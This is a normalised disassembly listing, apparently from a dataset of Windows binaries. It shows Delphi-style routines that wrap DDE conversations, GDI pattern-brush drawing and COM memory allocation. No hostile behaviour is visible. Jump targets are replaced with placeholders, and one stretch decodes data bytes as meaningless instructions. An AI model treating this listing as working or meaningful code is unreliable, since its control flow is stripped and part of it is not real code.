pop edi
pop esi
pop ebx
retn
push esp
push 0x3e8
push 0x20b0
mov eax [ eax + 0xa8 ]
push eax
mov eax [ edi + 0x8 ]
push eax
push edx
push 0xffffffff
push 0x0
call DdeClientTransaction
mov esi eax
test esi esi
je r-xdata
mov edx esi
mov eax edi
call sub_46aecc
push esi
call DdeFreeDataHandle
mov bl 0x1
jmp r-xdata
sub_46b020
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] 0x0
mov eax [ ebx + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax [ ebx + 0x4 ]
call sub_4042f8
test eax eax
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea edx [ esp + 0x4 ]
push edx
push 0x3e8
push 0x1034
mov eax [ ebx + 0xc ]
mov edx [ eax + 0xa8 ]
push edx
mov edx [ ebx + 0x8 ]
push edx
mov eax [ eax + 0x38 ]
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
test eax eax
jne r-xdata
push 0x3ec
mov eax [ ebx + 0x4 ]
call sub_4044f8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x8 ] eax
mov [ esp ] 0x1
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
sub_46b0d8
push ebx
push esi
push ecx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax ebx
call sub_46b118
mov al 0x1
pop edx
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
test edx edx
je r-xdata
push esp
push 0x3e8
push 0x8040
mov ecx [ esi + 0xa8 ]
push ecx
push edx
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
sub_46b118
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
sub_46b144
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d098
mov [ esi + 0x48 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_46b190
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d0e4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_46b1d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_404038
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_46b1fc
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x48 ] 0x1
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax ebx
call sub_46b2ac
pop esi
pop ebx
retn
sub_46b228
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46b29c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x8 ]
pop edx
call sub_40802c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b2a3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
mov [ ebx + 0x48 ] 0x1
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
call sub_46b2ac
sub_46b2ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46b333
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3a ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_46a110
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b33a
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43fcb0
mov edx [ ebp - 0x4 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_46a110
sub_46b340
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46b3c3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push edi
call DdeAccessData
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b3ca
lea eax [ ebp - 0xc ]
call sub_404038
retn
lea eax [ ebp - 0xc ]
mov edx esi
call sub_404230
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
push edi
call DdeUnaccessData
mov eax ebx
call sub_46b2ac
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x8000
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_46b3e8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41d3b4
cmp esi [ edi + 0x34 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x34 ] eax
sub_46b410
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d098
mov edx esi
mov eax [ rw-data ]
call sub_46a174
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_46b454
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_46a188
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d0e4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_46b488
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push sub_46b513
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
lea eax [ ebp - 0x4 ]
push eax
push edx
call DdeAccessData
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b51a
lea eax [ ebp - 0xc ]
call sub_404038
retn
cmp [ esi + 0x42 ] 0x0
je r-xdata
mov edi 0x8000
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404230
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ esi + 0x44 ]
call [ esi + 0x40 ]
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_46b54c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d098
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ esi + 0x44 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_46b590
push ebx
push esi
push edi
push ebp
call sub_403674
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x34 ]
test eax eax
je r-xdata
push eax
call DdeDisconnect
mov eax [ ebp + 0x44 ]
call sub_4032e8
xor eax eax
mov [ ebp + 0x44 ] eax
inc esi
xor edi edi
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41d0e4
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebp + 0x34 ] eax
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_417570
call sub_4032e8
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40365c
sub_46b614
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x1008 ] ebx
mov ebx eax
xor eax eax
push ebp
push sub_46b734
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b73b
lea eax [ ebp - 0x100c ]
mov edx 0x2
call sub_40405c
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1001 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1008 ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_4042a8
mov eax [ ebp - 0x1008 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_46b960
mov edi eax
test edi edi
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46bad8
mov esi eax
mov [ esi + 0x3c ] edi
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_4042a8
mov edx [ ebp - 0x100c ]
mov eax esi
call sub_46bc34
mov edx esi
mov eax [ ebx + 0x44 ]
call sub_417414
mov edx ebx
mov eax esi
call sub_41d168
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x1
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_4044f8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x34 ] eax
sub_46b748
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_46ba84
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov edx ebx
mov eax [ esi + 0x44 ]
call sub_4176b4
mov eax ebx
call sub_4032e8
sub_46b778
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1004 ] ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a3c#9
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b822
lea eax [ ebp - 0x1004 ]
call sub_404038
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1000 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1004 ]
lea edx [ ebp - 0x1000 ]
mov ecx 0x1000
call sub_4042a8
mov eax [ ebp - 0x1004 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_46b960
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
call sub_46b340
mov esi eax
sub_46b82c
push ebp
mov ebp esp
xor edx edx
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
mov eax edx
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov eax ecx
call sub_46b488
mov edx eax
sub_46b84c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_46b94d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax ebx
call sub_46ba84
test eax eax
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1008 ]
mov ecx 0x1000
call sub_4042a8
mov eax [ ebp - 0x100c ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_46b960
mov ebx eax
test ebx ebx
je r-xdata
mov dx [ ebp + 0x8 ]
call sub_46bb50
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b954
lea eax [ ebp - 0x100c ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_404038
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax [ ebp + 0x8 ]
push eax
push esi
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4042f8
inc eax
push eax
mov eax [ ebp - 0x8 ]
call sub_4044f8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov [ ebp - 0x4 ] eax
sub_46b960
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov edi edx
test edi edi
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
call sub_41d6bc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
inc esi
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404444
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x4 ]
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46b960
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_41d690
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
sub_46ba34
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_417570
mov ebx eax
mov eax [ ebx + 0x34 ]
mov edx [ esp ]
call sub_404444
jne r-xdata
sub_46ba84
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_417570
mov ebx eax
mov eax [ esp ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call DdeCmpStringHandles
test eax eax
jne r-xdata
sub_46bad8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x30 ] ecx
xor edx edx
mov eax esi
call sub_41d098
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_46bb10
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d0e4
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ esi + 0x38 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_46bb50
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46bc05
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1004 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1004 ]
lea eax [ ebx + 0x34 ]
call sub_404128
cmp si 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bc0c
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax si
push eax
mov eax [ ebx + 0x38 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4042f8
inc eax
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_46bc34
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_40408c
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
call sub_4042f8
test eax eax
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
push 0x3ec
mov eax [ ebx + 0x34 ]
call sub_4044f8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x38 ] eax
sub_46bc90
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46bcc1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bcc8
retn
mov eax rw-data
call sub_40d18c
sub_46bccc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_469b20
mov [ rw-data ] eax
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
sub_46bd30
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46bd55
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bd5c
retn
sub_46cb62
add eax 0xc0000000
loope r-xdata
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0xcb02da82
inc esi
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ss
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
add cl bl
inc esi
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax 0x1
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
add cl bl
inc esi
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
add cl bl
inc esi
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0xcb4eda82
inc esi
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x46cc40c0 ] cl
add [ edx - 0x35 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x34 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x34 ] dl
inc esi
add [ eax + eax ] bh
add [ eax ] al
inc esp
adc al [ eax ]
xor [ 0x59a80040 ] dh
inc eax
add [ ecx + ebx * 2 + 0x35440040 ] dh
inc eax
add [ eax ] bh
xor eax 0x59c40040
inc eax
add [ edx + esi - 0xc9bffc0 ] bl
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al dh
inc edi
inc ecx
add [ eax + eax ] dl
add [ eax ] al
or [ edi + ecx * 2 + 0x6c ] dl
inc esi
outsd
jb r-xdata
int 0xda
push 0x1
push 0x1
push 0x8
push 0x8
call CreateBitmap
mov edi eax
push edi
call CreatePatternBrush
push eax
push ebx
call SelectObject
mov ebp eax
push 0xffffff
push ebx
call SetTextColor
mov [ esp ] eax
push 0x0
push ebx
call SetBkColor
mov [ esp + 0x4 ] eax
push 0xa000c9
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
push ebx
call PatBlt
mov eax [ esp + 0x4 ]
push eax
push ebx
call SetBkColor
mov eax [ esp ]
push eax
push ebx
call SetTextColor
push ebp
push ebx
call SelectObject
push eax
call DeleteObject
push edi
call DeleteObject
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
nop
sub_46cc5c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx ]
push eax
call MulDiv
mov [ esi ] eax
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call MulDiv
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_46cc94
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push ebx
call GlobalLock
mov eax [ eax + 0xc ]
push eax
call DeleteMetaFile
push ebx
call GlobalUnlock
push ebx
call GlobalFree
sub_46ccb8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
push rw-data
push 0x1
push 0x1
push 0x8
push 0x8
call CreateBitmap
mov edi eax
push edi
call CreatePatternBrush
push eax
push ebx
call SelectObject
mov ebp eax
push 0xffffff
push ebx
call SetTextColor
mov [ esp ] eax
push 0x0
push ebx
call SetBkColor
mov [ esp + 0x4 ] eax
push 0xa000c9
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
push ebx
call PatBlt
mov eax [ esp + 0x4 ]
push eax
push ebx
call SetBkColor
mov eax [ esp ]
push eax
push ebx
call SetTextColor
push ebp
push ebx
call SelectObject
push eax
call DeleteObject
push edi
call DeleteObject
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46cd50
push ebx
mov ebx eax
mov eax ebx
call sub_4042f8
inc eax
push eax
call CoTaskMemAlloc
push eax
mov eax ebx
call sub_4044f8
mov edx eax
pop eax
call sub_408860
pop ebx
retn
sub_46cd74
push ebx
push ecx
mov ebx edx
push esp
push 0x1
push eax
mov eax [ eax ]
call [ eax + 0x40 ]
mov eax ebx
mov edx [ esp ]
call sub_404260
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop ebx
retn
sub_46cd98
push ebx
push ecx
mov ebx edx
push esp
push 0x2
push eax
mov eax [ eax ]
call [ eax + 0x40 ]
mov eax ebx
mov edx [ esp ]
call sub_404260
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop ebx
retn
sub_46cdbc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x264 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x264 ]
mov ecx r-xdata
call sub_40596c
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f2f4
sub_46ce00
push ebx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
xor eax eax
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov al 0x1
pop ebx
retn
sub_46ce28
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push j_sub_403a3c#8
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
test edi edi
je r-xdata
mov eax ebx
call sub_46da64
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x21c ]
call sub_46cd74
mov eax [ ebp - 0x4 ]
call sub_46cd50
mov [ edi ] eax
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x21c ]
call sub_46cd74
mov eax [ ebp - 0x8 ]
call sub_46cd50
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
mov eax [ ebp + 0x20 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x21c ]
call sub_46cd98
mov eax [ ebp - 0xc ]
call sub_46cd50
mov edx [ ebp + 0x1c ]
mov [ edx ] eax
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cf02
lea eax [ ebp - 0x10 ]
call sub_404038
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40405c
retn
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_43fcb0
mov eax [ ebp - 0x10 ]
call sub_46cd50
mov edx [ ebp + 0x20 ]
mov [ edx ] eax
sub_46cf38
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
